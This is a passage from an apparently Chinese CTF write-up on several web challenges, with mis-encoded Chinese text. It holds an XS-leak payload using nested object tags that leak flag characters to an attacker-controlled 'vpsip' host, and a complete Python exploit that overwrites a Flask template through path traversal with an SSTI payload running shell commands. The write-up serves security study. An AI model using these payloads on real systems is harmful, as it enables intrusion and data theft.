punctuation">(</span><span class="token string">".json"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> noteData <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"./notes/"</span><span class="token operator">+</span>noteId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>noteId<span class="token operator">+</span><span class="token string">".json"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>noteId<span class="token operator">===</span>healthCheckId<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">cleanserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">delete</span> module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>temp <span class="token operator">!==</span> undefined<span class="token punctuation">)</span><span class="token punctuation">{</span>      fs<span class="token punctuation">.</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>unlinkError<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>unlinkError<span class="token punctuation">)</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'File missing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        noteList<span class="token operator">=</span>noteList<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>value<span class="token operator">!=</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'view'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> noteData <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒä¸ªè·¯ç”±<code>/healthcheck</code>å°±æ˜¯è®©<code>bot</code>è®¿é—®<code>helthcheck.json</code>è¿™ä¸ªæ–‡ä»¶äº†ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">healthCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> response<span class="token operator">=</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/view/Healthcheck"</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸‰ä¸ªè·¯ç”±<code>/search/:noteId</code>å¯ä»¥åŒ¹é…çˆ†ç ´<code>flag</code>è·¯å¾„ã€‚</p><pre class="line-numbers language-js"><code class="language-js"> flag<span class="token operator">=</span><span class="token template-string"><span class="token string">`{"title":"flag","content":"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"}`</span></span><span class="token punctuation">;</span><span class="token keyword">const</span> flagid <span class="token operator">=</span> <span class="token function">generateNoteId</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flagid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/search/:noteId'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> noteId <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">;</span>  <span class="token keyword">const</span> notes<span class="token operator">=</span>glob<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">*`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>notes<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>Message<span class="token punctuation">:</span> <span class="token string">"Not found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>      fs<span class="token punctuation">.</span><span class="token function">accessSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>Message<span class="token punctuation">:</span> <span class="token string">"Note found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬è‚¯å®šæ˜¯è¦å€ŸåŠ©<code>search</code>æ¥çˆ†ç ´<code>flag</code>çš„<code>path</code>çš„ï¼Œä½†æ˜¯<code>search</code>åªèƒ½æœ¬åœ°è®¿é—®ã€‚è€Œ<code>bot</code>åªæ˜¯è®¿é—®<code>http://localhost:3000/view/Healthcheck</code>ã€‚æˆ‘ä»¬çš„ç›®æ ‡è‚¯å®šæ˜¯ç¯¡æ”¹<code>Healthcheck</code>çš„å†…å®¹ä»è€Œæ‰“<code>xs-leak</code>ã€‚</p><h6 id="ä¿®æ”¹requireç¼“å­˜"><a href="#ä¿®æ”¹requireç¼“å­˜" class="headerlink" title="ä¿®æ”¹requireç¼“å­˜"></a>ä¿®æ”¹requireç¼“å­˜</h6><p>è¿™æ­¥çœ‹ä¸æ‡‚ï¼Œåé¢å†è¡¥å§ã€‚ã€‚</p><h6 id="SSLEAK"><a href="#SSLEAK" class="headerlink" title="SSLEAK"></a>SSLEAK</h6><p><code>bot</code>ç¦ç”¨<code>js</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Object</code>ç»•è¿‡ï¼Œé€šè¿‡<code>search</code>é€ä½çˆ†ç ´å‡º<code>flag</code>ã€‚</p><pre><code>&lt;object data=&#39;http://127.0.0.1:3000/search/&#123;A-z0-9&#125;&#39;&gt;&lt;object data=&#39;http://vpsip/found/&#123;i&#125;&#39;&gt;&lt;/object&gt;&lt;/object&gt;</code></pre><h4 id="bad-notes"><a href="#bad-notes" class="headerlink" title="bad_notes"></a>bad_notes</h4><p>æ²¡æ¥å¾—åŠçœ‹ï¼Œæ¯”èµ›çš„æ—¶å€™å…‰çœ‹<code>image gallery</code>äº†ã€‚è¿™é¢˜é¢„æœŸåº”è¯¥è¿˜æ˜¯ç©ç¼“å­˜ï¼Ÿä¸€çœ¼<code>file = os.path.join(file_path,title)</code>ï¼Œ<code>title</code>é‚£é‡Œå¯æ§æœ‰ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p><p>é€šè¿‡<code>/makenote</code>ä¼ ä¸ª<code>SSTI</code>è¦†ç›–<code>login.html</code>å³å¯ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯æ¨¡ç‰ˆåªè¦æ¸²æŸ“ä¸€æ¬¡å°±æœ‰ç¼“å­˜ï¼Œå› æ­¤æ‰“å¼€é¶æœºä¹‹åä¸è¦è®¿é—®ï¼Œç›´æ¥<code>post</code>æ³¨å†Œç™»é™†å³å¯ã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:7000/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>user<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">}</span>proxies<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8081"</span><span class="token punctuation">}</span>files<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"/app/templates/login.html"</span><span class="token punctuation">,</span>    <span class="token string">"content"</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"{{g.pop.__globals__.__builtins__['__import__']('os').popen('sudo cat /flag').read()}}"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"register"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>user<span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>user<span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"makenote"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>files<span class="token punctuation">)</span>r<span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="image-gallery1"><a href="#image-gallery1" class="headerlink" title="image gallery1"></a>image gallery1</h4><p>è¿™é¢˜å…¶å®ä¸ç®—éš¾ï¼Œä½†æ˜¯å¾ˆå·§å¦™ã€‚åç‰¢äº†å››ä¸ªå°æ—¶å®Œå…¨æ²¡æ€è·¯ï¼Œåªèƒ½è¯´æ™ºå•†ä¸å¤Ÿã€‚</p><h5 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p><code>bot</code>é¢˜ï¼Œç‚¹å‡»<code>share</code>çš„è¯ä¼šæŠŠ<code>flag sid</code>å½“æˆ<code>cookie</code>ã€‚æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯<code>bot</code>å…ˆè®¿é—®äº†<code>/index</code>éšåè®¿é—®<code>index?f</code>æ¸²æŸ“å›¾ç‰‡ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span>flag_id<span class="token punctuation">,</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    args<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>        <span class="token string">"--headless"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    executablePath<span class="token punctuation">:</span> <span class="token string">"/usr/bin/google-chrome"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                  httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            name<span class="token punctuation">:</span> <span class="token string">'sid'</span><span class="token punctuation">,</span>            value<span class="token punctuation">:</span> flag_id<span class="token punctuation">,</span>            domain<span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`http://localhost:3000/`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>      <span class="token template-string"><span class="token string">`http://localhost:3000/?f=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>      <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">5000</span> <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> visit <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€è·¯å®Œå…¨é”™äº†ï¼Œæˆ‘è¿˜åœ¨æƒ³<code>?f</code>æ¸²æŸ“å›¾ç‰‡æ˜¯ä¸æ˜¯è¦çœ‹<code>index.ejs</code>æ€ä¹ˆæ¸²æŸ“å›¾ç‰‡çš„ï¼Œæ˜¯ä¸æ˜¯èƒ½é€ƒé€¸å‡ºä¸€ä¸ªå±æ€§ä»è€Œæ‰“<code>XSS</code>ã€‚ä½†å®é™…ä¸Šå¦‚æœæ˜¯<code>?f</code>é‚£é‡Œèƒ½<code>XSS</code>çš„è¯<code>bot</code>å°±æ²¡å¿…è¦è®¿é—®ä¸¤æ¬¡äº†ã€‚å¹¶ä¸”<code>index.ejs</code>é‚£é‡Œä¹Ÿç©¶æå®‰å…¨ã€‚</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">const</span> galleryDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.gallery'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> file <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> modal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bootstrap<span class="token punctuation">.</span>Modal</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'imageModal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> modalImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'modalImage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    modalImage<span class="token punctuation">.</span>src <span class="token operator">=</span> file    modal<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">const</span> gallery <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.gallery'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gallery<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>tagName <span class="token operator">===</span> <span class="token string">'IMG'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> modal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bootstrap<span class="token punctuation">.</span>Modal</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'imageModal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> modalImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'modalImage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"modelbutton"</span><span class="token punctuation">)</span>        modalImage<span class="token punctuation">.</span>src <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src<span class="token punctuation">;</span>        btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/share'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            method<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>            headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>              <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            body<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>id <span class="token punctuation">:</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            credentials<span class="token punctuation">:</span> <span class="token string">"include"</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> modal<span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        modal<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>    <span class="token keyword">const</span> fileNames <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">'&lt;%= files %>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>fileNames<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          fileName <span class="token operator">=</span> fileNames<span class="token punctuation">[</span>i<span class="token punctuation">]</span>          <span class="token keyword">const</span> imgElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          imgElement<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token string">`/&lt;%= id %>/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>          